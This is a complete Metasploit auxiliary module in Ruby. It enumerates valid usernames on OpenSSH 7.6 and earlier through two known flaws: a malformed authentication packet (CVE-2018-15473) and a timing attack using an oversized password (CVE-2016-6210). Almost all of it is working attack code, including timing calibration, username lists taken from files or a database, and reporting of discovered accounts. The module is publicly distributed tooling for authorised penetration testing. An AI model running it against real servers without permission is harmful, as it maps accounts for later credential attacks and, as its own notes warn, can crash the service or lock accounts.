##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Module::Deprecated
  moved_from 'auxiliary/scanner/ssh/ssh_enumusers'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenSSH 7.6 And Earlier Username Enumeration',
        'Description' => %q{
          This module uses a malformed packet or timing attack to enumerate users on
          an OpenSSH server.

          The Malformed Packet action (default) sends a malformed (corrupted)
          SSH_MSG_USERAUTH_REQUEST packet using public key authentication
          (which needs to be enabled server-side). OpenSSH <= 7.6 responds
          differently for valid vs. invalid users, exposing their existence
          (CVE-2018-15473).

          The Timing Attack action submits an oversized password via
          keyboard-interactive or password authentication. OpenSSH <= 7.2
          with UsePAM enabled returns 'permission denied' faster for invalid
          users than valid ones, exposing their existence via timing
          (CVE-2016-6210).

          NOTE: Invalid users were logged server side, while valid users were not. YMMV.
        },
        'Author' => [
          'kenkeiras',     # Timing attack
          'Dariusz Tytko', # Malformed packet
          'Michal Sajdak', # Malformed packet
          'Qualys',        # Malformed packet
          'wvu',           # Malformed packet
          'g0tmi1k' # @g0tmi1k - additional features
        ],
        'References' => [
          ['CVE', '2003-0190'],
          ['CVE', '2006-5229'],
          ['CVE', '2016-6210'],
          ['CVE', '2018-15473'],
          ['OSVDB', '32721'],
          ['BID', '20418'],
          ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
          ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Malformed Packet',
            {
              'Description' => 'Use a malformed packet (OpenSSH <= 7.6, CVE-2018-15473)',
              'Type' => :malformed_packet
            }
          ],
          [
            'Timing Attack',
            {
              'Description' => 'Use a timing attack (OpenSSH <= 7.2, CVE-2016-6210)',
              'Type' => :timing_attack
            }
          ]
        ],
        'DefaultAction' => 'Malformed Packet',
        'Notes' => {
          'Stability' => [
            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service
          ],
          'Reliability' => [],
          'SideEffects' => [
            IOC_IN_LOGS,
            ACCOUNT_LOCKOUTS, # timing attack submits a password
          ]
        }
      )
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptString.new('USERNAME',
                      [false, 'Single username to test (username spray)']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line']),
        OptBool.new('DB_ALL_USERS',
                    [false, 'Add all users in the current database to the list', false]),
        OptInt.new('THRESHOLD',
                   [
                     true,
                     'Amount of seconds needed before a user is considered ' \
                     'found (timing attack only)', 10
                   ]),
        OptBool.new('CHECK_FALSE',
                    [false, 'Check for false positives (random username)', true])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('CALIBRATE_COUNT',
                   [
                     false, 'Number of random-username samples used to auto-calibrate ' \
                     'the timing threshold (timing attack only, 0 to disable)', 5
                   ]),
        OptInt.new('RETRY_NUM',
                   [
                     true, 'The number of retries on connection error per user', 3
                   ])
      ]
    )
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def threshold
    @calibrated_threshold || datastore['THRESHOLD']
  end

  def calibrate_threshold(ip)
    sample_count = datastore['CALIBRATE_COUNT']
    return if sample_count.zero?

    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Calibrating timing threshold with #{sample_count} samples...")
    times = Array.new(sample_count) do
      user = Rex::Text.rand_text_alphanumeric(8..32)
      t0 = Time.now
      attempt_user(user, ip, label: '<calibrating>')
      Time.now - t0
    end

    mean = times.sum / times.size
    variance = times.sum { |t| (t - mean)**2 } / times.size
    stddev = Math.sqrt(variance)
    @calibrated_threshold = (mean + 2 * stddev).ceil(2)
    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Calibrated threshold: #{@calibrated_threshold}s (mean: #{mean.round(2)}s, jitter: #{stddev.round(2)}s)")
  end

  def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8..32)
    attempt_user(user, ip, label: '<random>') == :success
  end

  def check_user(ip, user, port)
    technique = action['Type']

    opts = ssh_client_defaults.merge({
      port: port
    })

    # The auth method is converted into a class name for instantiation,
    # so malformed-packet here becomes MalformedPacket from the mixin
    case technique
    when :malformed_packet
      opts.merge!(auth_methods: ['malformed-packet'])
    when :timing_attack
      opts.merge!(
        auth_methods: ['password', 'keyboard-interactive'],
        password: rand_pass
      )
    end

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue ::Timeout::Error
      return :success if technique == :timing_attack
    rescue Net::SSH::AuthenticationFailed
      return :fail if technique == :malformed_packet
    rescue Net::SSH::Exception => e
      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - #{e.class}: #{e.message}")
    end

    finish_time = Time.new

    case technique
    when :malformed_packet
      return :success if ssh
    when :timing_attack
      elapsed = finish_time - start_time
      vprint_status("User '#{user}' - #{elapsed.round(2)}s (threshold: #{threshold}s)")
      return :success if elapsed > threshold
    end

    :fail
  end

  def rand_pass
    Rex::Text.rand_text_english(64_000..65_000)
  end

  def do_report(ip, port, user)
    service_data = {
      address: ip,
      port: port,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def user_list
    users = []

    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?

    if datastore['USER_FILE']
      fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
      file_users = File.read(datastore['USER_FILE']).split
      vprint_status("Loaded #{file_users.size} users from #{datastore['USER_FILE']}")
      users += file_users
    end

    if datastore['DB_ALL_USERS']
      if framework.db.active
        db_users = framework.db.creds(workspace: myworkspace.name).filter_map { |o| o.public&.username }
        vprint_status("Loaded #{db_users.size} users from database")
        users += db_users
      else
        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
      end
    end

    users.uniq
  end

  def attempt_user(user, ip, label: user)
    attempt_num = 0
    ret = nil

    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
      if attempt_num > 0
        Rex.sleep(2**attempt_num)
        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Retrying '#{label}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' found")
      do_report(ip, rport, user)
    when :connection_error
      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' could not connect")
    when :fail
      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' not found")
    end
  end

  def run
    fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE and/or USERNAME') unless datastore['USERNAME'].present? || datastore['USER_FILE'] || datastore['DB_ALL_USERS']

    super
  end

  def check_banner_version(ip, banner)
    return unless banner

    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - SSH banner: #{Rex::Text.to_hex_ascii(banner.strip)}")
    report_ssh_service(ip, rport, info: banner)
    report_ssh_host(banner, ip, rport)

    match = banner.match(/OpenSSH[_ ](\d+\.\d+)/i)
    return unless match

    version = Rex::Version.new(match[1])
    max_version, cve = case action['Type']
                       when :malformed_packet then ['7.6', 'CVE-2018-15473']
                       when :timing_attack then ['7.2', 'CVE-2016-6210']
                       end

    if version > Rex::Version.new(max_version)
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may NOT be vulnerable (#{action.name}/#{cve} affects <= #{max_version})")
    else
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may be vulnerable to #{action.name}/#{cve}")
      return "OpenSSH #{match[1]} <= #{max_version}, #{action.name}/#{cve}"
    end
  end

  def run_host(ip)
    banner = grab_ssh_banner(ip)
    if banner.nil?
      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - No response (port closed or wrong service)")
      report_host(host: ip)
      return
    end
    vuln_context = check_banner_version(ip, banner)

    calibrate_threshold(ip) if action['Type'] == :timing_attack
    print_warning("#{Rex::Socket.to_authority(rhost, rport)} - #{action.name} may be unreliable on low-latency networks (#{@calibrated_threshold}s)") if action['Type'] == :timing_attack && @calibrated_threshold && @calibrated_threshold < 3.0

    if datastore['CHECK_FALSE']
      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking for false positives")
      if check_false_positive(ip)
        print_error("#{Rex::Socket.to_authority(rhost, rport)} - False positive check failed as server returned valid for a random username")
        return
      end
    end

    users = user_list
    return if users.empty?

    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Starting SSH username enumeration")
    found_users = users.select do |user|
      result = attempt_user(user, ip)
      show_result(result, user, ip)
      result == :success
    end

    if vuln_context && !found_users.empty?
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        sname: 'ssh',
        name: name,
        info: vuln_context,
        refs: references
      )
    end
  end
end
